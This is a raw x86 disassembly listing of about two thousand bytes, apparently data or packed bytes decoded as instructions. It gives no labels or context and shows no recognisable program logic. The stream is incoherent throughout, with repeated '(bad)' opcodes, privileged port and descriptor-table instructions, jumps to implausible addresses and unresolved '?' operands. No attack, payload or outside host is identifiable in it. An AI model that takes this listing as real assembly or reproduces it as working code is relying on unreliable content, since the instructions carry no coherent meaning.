  4309fa:	add    BYTE PTR [eax],ch
  4309fc:	neg    DWORD PTR [ebx]
  4309fe:	add    DWORD PTR [ecx-0x46f3534e],edi
  430a04:	cmp    DWORD PTR ds:0xeb88b56a,0x6bce74fe
  430a0e:	inc    esp
  430a0f:	jns    0x430a3e
  430a11:	(bad)  
  430a12:	inc    DWORD PTR [edx+ebx*4+0x2d694019]
  430a19:	cld    
  430a1a:	test   DWORD PTR [edi],esi
  430a1c:	mov    ds:0xb6978312,eax
  430a21:	repz add ch,BYTE PTR [edx+0x24]
  430a25:	xchg   ebx,eax
  430a26:	test   BYTE PTR [eax],0x0
  430a29:	add    BYTE PTR [eax],al
  430a2b:	add    BYTE PTR [ebp-0x7ccb8b1e],ah
  430a31:	scas   al,BYTE PTR es:[edi]
  430a32:	call   0x4f786b6c
  430a37:	add    BYTE PTR [esi],bl
  430a39:	les    esp,FWORD PTR [esi+0x12]
  430a3c:	imul   esi,DWORD PTR [esi-0x95bf96b],0x76f6105f
  430a46:	jmp    FWORD PTR [edi]
  430a48:	cmp    DWORD PTR [edx+0x2d3f8b0e],esi
  430a4e:	into   
  430a4f:	mov    DWORD PTR [eax-0x4a],edx
  430a52:	repz adc BYTE PTR [edx+0x2a58f3ee],al
  430a59:	sbb    ch,cl
  430a5b:	mov    ebx,DWORD PTR [edi+0x4eb33f0e]
  430a61:	sbb    DWORD PTR ds:0xac7d0fc0,edi
  430a67:	push   ebp
  430a68:	jb     0x430a74
  430a6a:	(bad)  
  430a6b:	in     al,dx
  430a6c:	int    0xb6
  430a6e:	push   cs
  430a6f:	add    BYTE PTR [edx],bl
  430a71:	test   BYTE PTR [ecx+esi*8-0x7a1dd2fa],dl
  430a78:	nop
  430a79:	int    0xe7
  430a7b:	or     ebp,0xffffff9b
  430a7e:	sldt   WORD PTR ds:0xc03c3f5d
  430a85:	lods   al,BYTE PTR ds:[esi]
  430a86:	cwde   
  430a87:	call   DWORD PTR [esi-0x600047e4]
  430a8d:	fwait
  430a8e:	ins    BYTE PTR es:[edi],dx
  430a8f:	pop    esp
  430a90:	add    BYTE PTR [eax],al
  430a92:	add    BYTE PTR [eax],al
  430a94:	add    BYTE PTR [eax+ebx*1-0x62faff8b],al
  430a9b:	inc    edi
  430a9c:	inc    bx
  430a9e:	test   BYTE PTR [eax-0x7a],bh
  430aa1:	adc    BYTE PTR [esi],0x5e
  430aa4:	or     cl,BYTE PTR [ebx+eax*2]
  430aa7:	lldt   WORD PTR [eax-0x6ff808e8]
  430aae:	out    dx,eax
  430aaf:	sar    edx,1
  430ab1:	in     eax,0x93
  430ab3:	xchg   esp,eax
  430ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ab5:	push   0x90fa7855
  430aba:	push   ds
  430abb:	addr16 out 0x46,eax
  430abe:	inc    esp
  430abf:	js     0x430aa8
  430ac1:	test   DWORD PTR [esi],edx
  430ac3:	jns    0x430abf
  430ac5:	or     eax,0xc70cfb34
  430aca:	lds    esp,FWORD PTR [ebp-0x74]
  430acd:	cmp    BYTE PTR ds:0xe428fa79,ah
  430ad3:	(bad)  
  430ad4:	cli    
  430ad5:	pop    ss
  430ad6:	fmul   QWORD PTR [esi+0x790c0ee7]
  430adc:	add    edx,DWORD PTR [eax-0x7af065]
  430ae2:	xchg   dh,ah
  430ae4:	push   edx
  430ae5:	pop    esi
  430ae6:	es addr16 out 0xee,eax
  430aea:	jmp    0x430b64
  430aec:	out    0x4,eax
  430aee:	sbb    eax,0x550bfa79
  430af3:	sbb    esi,DWORD PTR [edi]
  430af5:	iret   
  430af6:	mov    cl,0x8a
  430af8:	mov    edx,0x0
  430afd:	add    BYTE PTR [esi+0x72],cl
  430b00:	and    eax,0xc5f414d3
  430b05:	ror    DWORD PTR [edi+eax*1],cl
  430b08:	push   es
  430b09:	ss leave 
  430b0b:	cdq    
  430b0c:	push   ebx
  430b0d:	imul   BYTE PTR [ecx+0x234371ac]
  430b13:	jmp    0x430aa4
  430b15:	adc    ecx,DWORD PTR ds:0x4d3d5f4
  430b1b:	test   ebp,0x51c68ad4
  430b21:	adc    dl,al
  430b23:	mov    dl,0x78
  430b25:	inc    eax
  430b26:	mov    esi,DWORD PTR ds:0x1895efb5
  430b2c:	cli    
  430b2d:	shr    DWORD PTR [edx-0x1a],cl
  430b30:	std    
  430b31:	test   bl,dl
  430b33:	mov    dl,0xa4
  430b35:	psubusb mm0,mm0
  430b38:	xor    eax,0x9730d04
  430b3d:	dec    esi
  430b3f:	shl    ch,cl
  430b41:	pop    esp
  430b42:	inc    ebp
  430b43:	loope  0x430afa
  430b45:	jg     0x430b46
  430b47:	es bnd jp 0x430bb2
  430b4b:	xchg   edi,eax
  430b4c:	loop   0x430bcc
  430b4e:	inc    esi
  430b4f:	es cmc 
  430b51:	jl     0x430bac
  430b53:	fwait
  430b54:	sbb    al,0xb6
  430b56:	sbb    ch,BYTE PTR [eax+ebp*4-0x2ef345bd]
  430b5d:	cmp    cl,BYTE PTR [ebp-0x45]
  430b60:	cmc    
  430b61:	jl     0x430b63
  430b63:	add    BYTE PTR [eax],al
  430b65:	add    BYTE PTR [eax],al
  430b67:	cwde   
  430b68:	add    al,0x71
  430b6a:	shl    DWORD PTR [ebx-0x5496d66],cl
  430b70:	stos   DWORD PTR es:[edi],eax
  430b71:	pusha  
  430b72:	je     0x430b88
  430b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430b75:	mov    eax,ds:0xeb66e1d
  430b7a:	ret    
  430b7b:	xchg   ebx,eax
  430b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430b7d:	and    DWORD PTR [ecx],eax
  430b7f:	or     eax,0x9f260ef0
  430b84:	sub    al,BYTE PTR [ecx]
  430b86:	test   eax,0x9dce3593
  430b8b:	mov    esi,0x54e92f2c
  430b90:	lods   eax,DWORD PTR ds:[esi]
  430b91:	and    BYTE PTR [ecx],ch
  430b93:	das    
  430b94:	imul   esp,DWORD PTR [edx-0x1b],0x2a
  430b98:	fisttp DWORD PTR [edx+ebp*1+0x1d]
  430b9c:	jns    0x430b94
  430b9e:	retf   0xa8dd
  430ba1:	jmp    0x430bbd
  430ba3:	aam    0x9
  430ba5:	shl    BYTE PTR [edi],1
  430ba7:	add    eax,0xfce13320
  430bac:	stc    
  430bad:	adc    al,cl
  430baf:	popf   
  430bb0:	pop    esp
  430bb1:	jmp    0x430b79
  430bb3:	in     al,dx
  430bb4:	mov    ecx,0xa81df2f6
  430bb9:	jmp    0x430c1d
  430bbb:	sbb    DWORD PTR [ebx-0x57e2150a],esi
  430bc1:	jmp    0x430c0a
  430bc3:	(bad)  
  430bc4:	scas   eax,DWORD PTR es:[edi]
  430bc5:	push   cs
  430bc6:	aaa    
  430bc7:	lds    esp,FWORD PTR [edx+0xfdf6]
  430bcd:	add    BYTE PTR [eax],al
  430bcf:	add    BYTE PTR [ebx-0x868f14e],dl
  430bd5:	into   
  430bd6:	push   ss
  430bd7:	call   0xafdabc1b
  430bdc:	retf   
  430bdd:	call   0xfd4:0x34a8769d
  430be4:	into   
  430be5:	scas   eax,DWORD PTR es:[edi]
  430be6:	push   cs
  430be7:	mov    edi,0x1a43a28c
  430bec:	jns    0x430c5e
  430bee:	adc    al,0x7d
  430bf0:	xor    al,0xeb
  430bf2:	push   cs
  430bf3:	adc    dl,ch
  430bf5:	mov    dh,0x64
  430bf7:	add    BYTE PTR [ecx+0x62df9485],bl
  430bfd:	jno    0x430c12
  430bff:	add    ebp,DWORD PTR [edx+0x1c012336]
  430c05:	test   al,0x6c
  430c07:	sar    BYTE PTR [ebp-0x59620c82],0x1a
  430c0e:	jmp    0x3439365a
  430c13:	cmp    eax,DWORD PTR [edi]
  430c15:	mov    ds:0x2df2e479,eax
  430c1a:	push   esi
  430c1b:	or     BYTE PTR [esi],al
  430c1d:	repnz dec ebp
  430c1f:	add    al,0x31
  430c21:	push   esi
  430c22:	sub    eax,DWORD PTR [eax]
  430c24:	pop    es
  430c25:	or     BYTE PTR [edi+0x3f1276b1],ch
  430c2b:	push   ebx
  430c2c:	mov    esp,0xe58b4078
  430c31:	rol    BYTE PTR [esi],cl
  430c33:	push   0x0
  430c35:	add    BYTE PTR [eax],al
  430c37:	add    BYTE PTR [eax],al
  430c39:	imul   esp,DWORD PTR [ecx+0x6ae007a0],0x2f
  430c40:	adc    al,0x87
  430c42:	xor    eax,0xa79d17e3
  430c47:	ins    DWORD PTR es:[edi],dx
  430c48:	cmp    ebp,DWORD PTR [edi]
  430c4a:	mov    ds:0xb6399992,al
  430c4f:	push   cs
  430c50:	retw   0x2f7a
  430c54:	sbb    al,0x8f
  430c56:	sub    eax,0x88492478
  430c5b:	and    al,0xdd
  430c5d:	sub    DWORD PTR es:[esi+0x3bb63900],ecx
  430c64:	ror    BYTE PTR [edi+0x3574c433],cl
  430c6a:	mov    BYTE PTR [edx-0x32571213],dl
  430c70:	inc    esp
  430c71:	lea    edi,[edx-0x536f14f3]
  430c77:	addr16 push ebx
  430c79:	lods   al,BYTE PTR ds:[esi]
  430c7a:	xchg   edi,eax
  430c7b:	or     dl,al
  430c7d:	fs xchg esi,eax
  430c7f:	nop
  430c80:	out    0x7d,eax
  430c82:	pop    esi
  430c83:	jmp    0xd8ba5e9
  430c88:	je     0x430cfa
  430c8a:	sbb    al,0x52
  430c8c:	add    esp,DWORD PTR [edx+0x24]
  430c8f:	adc    bh,bl
  430c91:	pusha  
  430c92:	xchg   edi,eax
  430c93:	push   0x73c213ef
  430c98:	jae    0x430cfa
  430c9a:	adc    al,0xcf
  430c9c:	and    eax,DWORD PTR [eax]
  430c9e:	add    BYTE PTR [eax],al
  430ca0:	add    BYTE PTR [eax],al
  430ca2:	add    BYTE PTR [ecx+edi*2+0x27],0x93
  430ca7:	sub    ebp,eax
  430ca9:	jae    0x430cff
  430cab:	xor    eax,0x41906607
  430cb0:	je     0x430cc6
  430cb2:	lock test eax,0xb112ffcf
  430cb8:	adc    cl,BYTE PTR [ebx]
  430cba:	inc    edi
  430cbb:	cwde   
  430cbc:	nop
  430cbd:	ret    
  430cbe:	test   bl,dl
  430cc0:	stos   BYTE PTR es:[edi],al
  430cc1:	jae    0x430c5c
  430cc3:	sbb    al,0x48
  430cc5:	adc    al,0xdd
  430cc7:	jg     0x430c8e
  430cc9:	sbb    ebp,DWORD PTR [ebx-0x63]
  430ccc:	lds    ecx,FWORD PTR [edi]
  430cce:	add    eax,0xe0530ed1
  430cd3:	push   eax
  430cd4:	(bad)  
  430cd5:	pop    ebx
  430cd6:	sahf   
  430cd7:	fist   DWORD PTR [edx]
  430cd9:	jg     0x430d2f
  430cdb:	(bad)  
  430cdc:	(bad)  
  430cdd:	jnp    0x430d4b
  430cdf:	xchg   edi,eax
  430ce0:	pcmpeqb mm3,QWORD PTR [eax+0x705969b9]
  430ce7:	mov    cl,0x69
  430ce9:	imul   esi,DWORD PTR [edx-0x15],0x6d92e712
  430cf0:	dec    edi
  430cf1:	pop    edx
  430cf2:	outs   dx,BYTE PTR ds:[esi]
  430cf3:	mov    dl,0xd2
  430cf5:	retf   0x7468
  430cf8:	stc    
  430cf9:	add    esp,DWORD PTR [ebp+0x3d]
  430cfc:	push   ecx
  430cfd:	sub    bl,0xd9
  430d00:	js     0x430cea
  430d02:	xchg   edi,eax
  430d03:	mov    dl,0x88
  430d05:	int    0x0
  430d07:	add    BYTE PTR [eax],al
  430d09:	add    BYTE PTR [eax],al
  430d0b:	inc    edx
  430d0c:	cmp    eax,0x5013f62e
  430d11:	cmc    
  430d12:	add    edx,DWORD PTR [eax-0x300845cb]
  430d18:	mov    bh,0x79
  430d1a:	xchg   edi,eax
  430d1c:	test   al,0xf5
  430d1e:	fnstenv [edi+0x37]
  430d21:	mov    edx,0xa5b22d4b
  430d26:	data16 test BYTE PTR [edx],dl
  430d29:	int3   
  430d2a:	ret    
  430d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d2c:	cmp    edi,DWORD PTR [edx-0xe91e105]
  430d32:	or     ch,0xa8
  430d35:	xor    al,0xc0
  430d37:	addr16 mov dl,0xf5
  430d3a:	add    edx,DWORD PTR [eax+0x7c4e039a]
  430d40:	test   al,0x70
  430d42:	mov    bh,0x8b
  430d44:	xor    ebp,DWORD PTR [edi-0x4e11e79b]
  430d4a:	pop    esp
  430d4b:	scas   eax,DWORD PTR es:[edi]
  430d4c:	sub    BYTE PTR [edx-0x39d9e99b],0x7a
  430d53:	int3   
  430d54:	xchg   edx,eax
  430d55:	jb     0x430dbc
  430d57:	ret    
  430d58:	lds    esp,FWORD PTR [eax-0x11]
  430d5b:	mov    ds:0xa1f0832d,eax
  430d60:	cmp    ebp,DWORD PTR [ebx-0x4d64b587]
  430d66:	mov    ah,0x2a
  430d68:	test   al,0x60
  430d6a:	cmp    al,0xe
  430d6c:	out    dx,al
  430d6d:	xchg   ebp,eax
  430d6e:	jnp    0x430d70
  430d70:	add    BYTE PTR [eax],al
  430d72:	add    BYTE PTR [eax],al
  430d74:	int3   
  430d75:	mov    cs,WORD PTR [esi]
  430d77:	pusha  
  430d78:	daa    
  430d79:	nop
  430d7a:	imul   edx
  430d7c:	mov    dh,dh
  430d7e:	repnz push 0xffffffef
  430d81:	mov    ecx,DWORD PTR [esi]
  430d83:	aad    0x9f
  430d85:	sub    eax,0x2db3ddce
  430d8a:	jmp    0x430d61
  430d8c:	out    dx,eax
  430d8d:	cs aad 0xbd
  430d90:	fwait
  430d91:	xor    eax,0x1e66e557
  430d96:	(bad)  
  430d97:	bound  eax,QWORD PTR [ebx-0x386413fc]
  430d9d:	sub    bh,ah
  430d9f:	shl    BYTE PTR es:[ebx-0x34a71762],0x97
  430da7:	lods   al,BYTE PTR ds:[esi]
  430da8:	xor    esi,DWORD PTR [eax]
  430daa:	(bad)  
  430dab:	add    DWORD PTR [edx+0x62],esp
  430dae:	jmp    0x430db6
  430db0:	sub    esi,esi
  430db2:	retf   0x7a11
  430db5:	(bad)  
  430db6:	jmp    0x430dae
  430db8:	sbb    dh,dh
  430dba:	repnz add DWORD PTR [edx-0x3e19149e],esi
  430dc1:	jb     0x430e0e
  430dc3:	aas    
  430dc4:	dec    ecx
  430dc5:	jp     0x430d97
  430dc7:	stc    
  430dc8:	xchg   ebx,eax
  430dc9:	std    
  430dca:	xchg   edi,eax
  430dcb:	mov    ebp,0x1a069b10
  430dd0:	push   esi
  430dd1:	add    al,0xec
  430dd3:	xor    al,0x5c
  430dd5:	fadd   st,st(7)
  430dd7:	bound  eax,QWORD PTR [eax]
  430dd9:	add    BYTE PTR [eax],al
  430ddb:	add    BYTE PTR [eax],al
  430ddd:	jmp    0x958f:0x65cdf30
  430de4:	inc    esp
  430de5:	in     al,0x3a
  430de7:	popa   
  430de8:	xchg   ebp,eax
  430de9:	fisttp DWORD PTR [ecx]
  430deb:	push   ss
  430dec:	xchg   esi,eax
  430ded:	lods   al,BYTE PTR ds:[esi]
  430dee:	xor    ecx,esi
  430df0:	adc    eax,0x61ab8f
  430df5:	sbb    eax,0x1f45b20
  430dfa:	pop    esi
  430dfb:	push   ss
  430dfc:	call   FWORD PTR [esi+0x75f4632a]
  430e02:	repz pop edi
  430e04:	adc    ebp,DWORD PTR [esi-0x68]
  430e07:	dec    DWORD PTR [edx+0x10630eae]
  430e0d:	aaa    
  430e0e:	push   cs
  430e0f:	arpl   ax,bp
  430e11:	push   ecx
  430e12:	sbb    dh,ah
  430e14:	dec    DWORD PTR [esi+0x29]
  430e17:	les    ecx,FWORD PTR [ebx-0x5028f451]
  430e1d:	sahf   
  430e1e:	push   cs
  430e1f:	xchg   ebp,eax
  430e20:	dec    ebp
  430e21:	push   ecx
  430e22:	or     ecx,edi
  430e24:	scas   eax,DWORD PTR es:[edi]
  430e25:	outs   dx,BYTE PTR ds:[esi]
  430e26:	push   cs
  430e27:	dec    ecx
  430e28:	pop    esi
  430e29:	inc    ebx
  430e2a:	repnz inc esp
  430e2c:	leave  
  430e2d:	imul   eax,ebx,0xe
  430e30:	push   esi
  430e31:	xor    ah,BYTE PTR [ecx+eax*2]
  430e34:	mov    eax,DWORD PTR [edi]
  430e36:	stos   DWORD PTR es:[edi],eax
  430e37:	sub    DWORD PTR [ebx+0x7b],ebp
  430e3a:	retf   
  430e3b:	cdq    
  430e3c:	dec    esi
  430e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430e3e:	or     ah,BYTE PTR [eax]
  430e40:	scas   eax,DWORD PTR es:[edi]
  430e41:	add    BYTE PTR [eax],al
  430e43:	add    BYTE PTR [eax],al
  430e45:	add    BYTE PTR [esi+0x12],bh
  430e48:	nop
  430e49:	shl    ah,0xbb
  430e4c:	imul   ecx,eax,0x5e
  430e4f:	push   ss
  430e50:	aaa    
  430e51:	sbb    ebp,0xffffffda
  430e54:	sbb    al,BYTE PTR [eax]
  430e56:	lds    esp,FWORD PTR [edi-0x6a9eb96c]
  430e5c:	stos   DWORD PTR es:[edi],eax
  430e5d:	sub    BYTE PTR [edx+0x7c],ch
  430e60:	punpckhdq mm2,QWORD PTR [ecx+0x69246011]
  430e67:	(bad)  
  430e68:	call   0x2bebdb82
  430e6d:	add    BYTE PTR [edx-0x6f74e806],ch
  430e73:	aad    0x1a
  430e75:	(bad)  
  430e76:	fcomp  DWORD PTR [edx-0x3367b666]
  430e7c:	sar    BYTE PTR [ebp-0x795a646c],1
  430e82:	and    DWORD PTR [ecx],edx
  430e84:	mov    edi,0xd9109823
  430e89:	pop    es
  430e8a:	jnp    0x430e6e
  430e8c:	cmp    ah,BYTE PTR [edi-0x30]
  430e8f:	ret    
  430e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430e91:	mov    WORD PTR [esi-0x69],?
  430e94:	adc    al,0xb
  430e96:	xchg   ebx,eax
  430e97:	mov    WORD PTR [ebx+ecx*1],cs
  430e9a:	bound  esp,QWORD PTR [eax-0x3cbe7361]
  430ea0:	jp     0x430f02
  430ea2:	and    ch,bl
  430ea4:	outs   dx,DWORD PTR ds:[esi]
  430ea5:	out    0x92,al
  430ea7:	test   eax,0x834f
  430eac:	add    BYTE PTR [eax],al
  430eae:	add    al,dl
  430eb0:	inc    edi
  430eb1:	(bad)  
  430eb3:	dec    esi
  430eb4:	mov    ds:0x3088519c,eax
  430eb9:	and    DWORD PTR [edi],esp
  430ebb:	sbb    eax,ebp
  430ebd:	jp     0x430e7e
  430ebf:	imul   BYTE PTR [edi+ebp*2+0x16d93e5a]
  430ec6:	add    BYTE PTR [ebx],cl
  430ec8:	dec    eax
  430ec9:	xor    eax,DWORD PTR [ebx+ecx*8]
  430ecc:	dec    edx
  430ecd:	pop    ss
  430ece:	outs   dx,DWORD PTR ds:[esi]
  430ecf:	xchg   esi,eax
  430ed0:	and    ah,BYTE PTR [ebx+0x3769eb07]
  430ed6:	jg     0x430f29
  430ed8:	xchg   edi,eax
  430ed9:	ja     0x430e7e
  430edb:	ds je  0x430f4e
  430ede:	mov    ebp,0xbf99b8c
  430ee3:	call   0x9086f9fb
  430ee8:	jae    0x430f32
  430eea:	cmp    DWORD PTR [ecx+0x19f2049b],edx
  430ef0:	mov    dl,0xa
  430ef2:	pusha  
  430ef3:	push   ss
  430ef4:	repz leave 
  430ef6:	push   es
  430ef7:	push   ecx
  430ef8:	mov    ch,0x4c
  430efa:	fild   DWORD PTR [ebx-0x6e4cbb4b]
  430f00:	or     al,0x7b
  430f02:	xor    eax,0x5ffcca3
  430f07:	mov    edi,0x7e3da10c
  430f0c:	les    esi,FWORD PTR [eax-0x29]
  430f0f:	xchg   edx,eax
  430f10:	push   ds
  430f11:	stc    
  430f12:	push   esp
  430f13:	add    BYTE PTR [eax],al
  430f15:	add    BYTE PTR [eax],al
  430f17:	add    BYTE PTR [eax],cl
  430f19:	pop    ds
  430f1a:	push   edx
  430f1b:	bound  eax,QWORD PTR [ebx-0x15463a53]
  430f21:	mov    esi,0xb2a7f479
  430f26:	call   0xfcb52377
  430f2b:	enter  0x3ae0,0xaa
  430f2f:	addr16 dec esi
  430f31:	idiv   DWORD PTR [ecx]
  430f33:	bound  ecx,QWORD PTR [esi]
  430f35:	ins    BYTE PTR es:[edi],dx
  430f36:	add    BYTE PTR [eax],dl
  430f38:	outs   dx,DWORD PTR ds:[esi]
  430f39:	jb     0x430ef0
  430f3b:	inc    esi
  430f3c:	push   cs
  430f3d:	femms  
  430f3f:	xchg   BYTE PTR [esi+eiz*4+0x1c],bl
  430f43:	push   ss
  430f44:	rcr    BYTE PTR [ecx-0x4d6eded0],1
  430f4a:	aaa    
  430f4b:	pop    es
  430f4c:	nop
  430f4d:	sbb    BYTE PTR [esi-0x4e35b815],bh
  430f53:	add    edi,DWORD PTR [eax+0x42]
  430f56:	xor    eax,DWORD PTR [ebx]
  430f58:	nop
  430f59:	aaa    
  430f5a:	(bad)  
  430f5b:	lea    edi,[eax+0x3a]
  430f5e:	inc    edx
  430f5f:	push   0x4da0dee
  430f64:	pmuludq mm2,QWORD PTR [ecx]
  430f67:	add    eax,0xa88e304b
  430f6c:	push   edi
  430f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430f6e:	push   cs
  430f6f:	jmp    0x50d5c707
  430f74:	mov    WORD PTR [edx+0x43c3720e],?
  430f7a:	push   cs
  430f7b:	jmp    0x430f80
  430f80:	add    BYTE PTR [ebx+0x17e6c02d],dl
  430f86:	sub    eax,0xb193e90e
  430f8b:	imul   esi,ebp,0x6bff070c
  430f91:	mov    bh,al
  430f93:	jecxz  0x430f27
  430f95:	or     eax,0x15912f7d
  430f9a:	out    dx,eax
  430f9b:	push   ss
  430f9c:	adc    dl,bl
  430f9e:	fist   WORD PTR [ebp+0x5dcb8ba4]
  430fa4:	sbb    eax,0xe9ff1f1b
  430fa9:	test   al,0x3a
  430fab:	inc    ecx
  430fac:	and    DWORD PTR ds:0x1fb50ede,edx
  430fb2:	sub    eax,0x9c14ed50
  430fb7:	push   ss
  430fb8:	mov    ebx,0x21cf24d8
  430fbd:	or     DWORD PTR [ebx-0x2bcc5b6b],0xffffffe4
  430fc4:	pusha  
  430fc5:	mov    DWORD PTR [edi-0x1e42e6d9],0x15c03e1b
  430fcf:	pop    ss
  430fd0:	xchg   DWORD PTR [esi],ecx
  430fd2:	jnp    0x431036
  430fd4:	rcl    BYTE PTR [edx],0x92
  430fd7:	jmp    0x430fb7
  430fd9:	xchg   ebx,eax
  430fda:	mov    dl,0xf
  430fdc:	repz xchg esp,eax
  430fde:	ja     0x431007
  430fe0:	sub    al,0xa0
  430fe2:	adc    al,0x9
  430fe4:	ins    BYTE PTR es:[edi],dx
  430fe5:	add    BYTE PTR [eax],al
  430fe7:	add    BYTE PTR [eax],al
  430fe9:	add    BYTE PTR [edi+ebx*1+0x20d51213],ch
  430ff0:	add    DWORD PTR [eax],eax
  430ff2:	loop   0x431060
  430ff4:	sbb    ebp,DWORD PTR [ecx]
  430ff6:	push   0x7c030e36
  430ffb:	mov    dh,0x95
  430ffd:	add    DWORD PTR [edx+0x6c8bef84],esi
  431003:	push   cs
  431004:	dec    esi
  431005:	jmp    0x430ff1
  431007:	lods   eax,DWORD PTR ds:[esi]
  431008:	pop    esp
  431009:	add    al,0x12
  43100b:	dec    ebx
  43100c:	ins    BYTE PTR es:[edi],dx
  43100d:	dec    ebp
  43100e:	adc    eax,0x201bc12
  431013:	mov    ah,0x3b
  431015:	shr    BYTE PTR [ecx-0x13],0x94
  431019:	adc    DWORD PTR gs:[esi],ebp
  43101c:	pop    edx
  43101d:	cld    
  43101e:	jbe    0x430fdd
  431020:	into   
  431021:	call   0x50e128
  431026:	stos   DWORD PTR es:[edi],eax
  431027:	mov    bl,0xe
  431029:	push   0xffffffe5
  43102b:	xchg   esi,eax
  43102c:	xchg   ebx,eax
  43102d:	sbb    DWORD PTR ds:0x94c1f6af,ebp
  431033:	scas   eax,DWORD PTR es:[edi]
  431034:	push   cs
  431035:	mov    edx,DWORD PTR [ebx+0x38]
  431038:	pop    edx
  431039:	fdivr  DWORD PTR [edx]
  43103b:	mov    edi,fs
  43103d:	add    BYTE PTR [edx],dh
  43103f:	jp     0x431068
  431041:	mov    ebp,ebp
  431043:	(bad)  
  431044:	ds mov esp,ebp
  431047:	push   cs
  431048:	cmp    bl,bl
  43104a:	xor    DWORD PTR [eax+esi*8+0x6a],esp
  43104e:	add    BYTE PTR [eax],al
  431050:	add    BYTE PTR [eax],al
  431052:	add    cl,bh
  431054:	xchg   esi,eax
  431055:	jmp    0x431086
  431057:	test   eax,0xa96a3eae
  43105c:	pop    edi
  43105d:	call   0x2be86977
  431062:	add    dl,dh
  431064:	add    eax,0x2c3d7597
  431069:	fnsave [ebx+ecx*8+0x2d]
  43106d:	inc    edx
  43106e:	loopne 0x431000
  431070:	adc    al,0x5c
  431072:	out    0x6e,eax
  431074:	pop    ds
  431075:	dec    esp
  431076:	cli    
  431077:	or     edi,ecx
  431079:	dec    esi
  43107a:	test   BYTE PTR [eax-0x18],dl
  43107d:	add    esp,DWORD PTR [esi-0x70]
  431080:	cmc    
  431081:	adc    dl,BYTE PTR [edx+0x1b]
  431084:	dec    ecx
  431085:	xchg   edi,eax
  431086:	(bad)  
  431087:	sub    BYTE PTR [ebp+0x4c],bl
  43108a:	cli    
  43108b:	aaa    
  43108c:	and    eax,0x4c14dbee
  431091:	(bad)  
  431092:	push   ss
  431093:	mov    edx,0x30744c8b
  431098:	shl    DWORD PTR [edx+edi*8+0x144b539d],0xb4
  4310a0:	jp     0x431071
  4310a2:	call   FWORD PTR [edx]
  4310a4:	inc    esp
  4310a5:	inc    ebx
  4310a6:	(bad)  
  4310a7:	fwait
  4310a8:	hlt    
  4310a9:	inc    ebx
  4310aa:	(bad)  
  4310ab:	or     BYTE PTR [edi+0x74],bl
  4310ae:	xchg   bh,bl
  4310b0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4310b2:	lods   al,BYTE PTR ds:[esi]
  4310b3:	out    0xf0,eax
  4310b5:	xchg   esi,eax
  4310b6:	(bad)  
  4310b7:	add    BYTE PTR [eax],al
  4310b9:	add    BYTE PTR [eax],al
  4310bb:	add    BYTE PTR [ebp-0x7f],ah
  4310be:	idiv   edi
  4310c0:	push   edi
  4310c1:	mov    ecx,DWORD PTR [edi]
  4310c3:	xchg   ax,ax
  4310c5:	inc    ecx
  4310c6:	dec    esp
  4310c7:	je     0x4310b1
  4310c9:	shl    ch,1
  4310cb:	xlat   BYTE PTR ds:[ebx]
  4310cc:	mov    ds:0xbe2f0f4b,al
  4310d1:	and    al,dh
  4310d3:	rcl    DWORD PTR [ebx],cl
  4310d5:	push   edi
  4310d6:	dec    ebx
  4310d7:	cli    
  4310d8:	sbb    ebx,edx
  4310da:	ja     0x4310e8
  4310dc:	arpl   bx,cx
  4310de:	sar    BYTE PTR [esi+0x7e77370b],cl
  4310e4:	frstor [edi-0x4cafd1b4]
  4310ea:	fdivr  QWORD PTR [ecx+edx*4]
  4310ed:	mov    dl,0xf5
  4310ef:	inc    edx
  4310f0:	in     eax,dx
  4310f1:	mov    esi,0xf688dc3d
  4310f6:	cmc    
  4310f7:	imul   edx,DWORD PTR [ecx+0x903f6df],0x7
  4310fe:	mov    cl,BYTE PTR [edx+0x60523558]
  431104:	dec    edi
  431105:	sub    al,0x3c
  431107:	and    BYTE PTR [edi+0x78],al
  43110a:	jo     0x431097
  43110c:	mov    edi,0xd03f5b2
  431111:	imul   eax,DWORD PTR [ecx],0xffffffed
  431114:	scas   al,BYTE PTR es:[edi]
  431115:	pop    edx
  431116:	jns    0x43111b
  431118:	nop
  431119:	mov    dl,0xe1
  43111b:	aad    0xbf
  43111d:	das    
  43111e:	test   eax,0x1c
  431123:	add    BYTE PTR [eax],al
  431125:	or     DWORD PTR [edi],esp
  431127:	scas   al,BYTE PTR es:[edi]
  431128:	or     cl,0xb2
  43112b:	jmp    0xca3b1fe8
  431130:	add    dl,bl
  431132:	add    DWORD PTR [ebp+0x31],esi
  431135:	push   cs
  431136:	push   0x5e
  431138:	ror    bl,1
  43113a:	ss xlat BYTE PTR cs:[ebx]
  43113d:	push   esi
  43113e:	sub    eax,0x2cbb02fb
  431143:	mov    ebx,0x5e77d6f3
  431148:	enter  0x2ab3,0x82
  43114c:	arpl   WORD PTR [esi],cx
  43114e:	mov    ch,0x72
  431150:	inc    ebx
  431151:	inc    ebx
  431152:	fldcw  WORD PTR [esi+0x35698b08]
  431158:	push   0xffffff94
  43115a:	xor    eax,0x77a70135
  43115f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431160:	mov    ah,0x9a
  431162:	push   es
  431163:	fimul  WORD PTR [edx-0x28e1c931]
  431169:	mov    dl,0x2b
  43116b:	push   cs
  43116c:	lods   al,BYTE PTR ds:[esi]
  43116d:	out    dx,eax
  43116e:	sub    dl,BYTE PTR [esi]
  431170:	push   0xffffffd2
  431172:	mov    bl,0x8f
  431174:	test   eax,0xbd593788
  431179:	stc    
  43117a:	outs   dx,BYTE PTR ds:[esi]
  43117b:	(bad)  
  43117c:	scas   eax,DWORD PTR es:[edi]
  43117d:	push   0xe9b54139
  431182:	inc    eax
  431183:	(bad)  
  431184:	xor    al,0xf0
  431186:	pushf  
  431187:	sahf   
  431188:	call   0x43118d
  43118d:	add    BYTE PTR [eax+0x4ca91fae],bh
  431193:	popa   
  431194:	xchg   edi,eax
  431195:	inc    esp
  431196:	lods   al,BYTE PTR ds:[esi]
  431197:	and    BYTE PTR [edx-0x5b],bl
  43119a:	aad    0xcd
  43119c:	into   
  43119d:	xchg   ecx,eax
  43119e:	neg    bl
  4311a0:	or     eax,0xeb3d1e9
  4311a5:	add    ebx,DWORD PTR [eax+ebx*1]
